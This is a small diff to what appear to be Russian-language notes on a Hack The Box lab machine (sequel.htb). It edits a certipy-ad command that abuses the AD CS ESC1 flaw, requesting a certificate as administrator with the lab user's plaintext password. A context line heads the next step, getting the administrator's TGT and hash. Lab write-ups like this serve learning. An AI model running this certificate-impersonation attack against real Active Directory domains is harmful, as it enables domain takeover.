@@ -469,7 +469,7 @@
 		& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 
 
-  		certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -debug
+  		certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target dc1.sequel.htb -ca sequel-dc-ca -template UserAuthentication -debug
 
 		ESC1 - 2. Получаем TGT и хеш администратора на основе сертификата
 
